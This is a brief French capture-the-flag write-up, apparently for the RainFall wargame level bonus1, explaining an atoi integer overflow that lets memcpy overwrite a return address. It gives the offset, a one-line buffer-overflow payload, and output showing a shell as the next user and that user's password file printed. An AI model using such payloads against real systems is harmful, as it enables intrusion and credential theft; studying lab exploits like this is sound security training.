# bonus1: ATOI OVERFLOW
> cette exploit conciste a overflow un atoi pour utiliser memcpy et passer par un nosled.

# OFFSET

>_*OFFSET:*_ -1073741803 * 4 = 84

# PAYLOAD

```bash
./bonus1 -1073741803 $(python -c 'print "A"*56 + "\xa4\x84\x04\x08" + "\xcc\xfc\xff\xbf"')
```

### EXEC
```bash
bonus1@RainFall:~$ ./bonus1 -1073741803 $(python -c 'print "A"*56 + "\xa4\x84\x04\x08" + "\xcc\xfc\xff\xbf"')
$ whoami
bonus2
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```

TADA ! on y est presque ! :)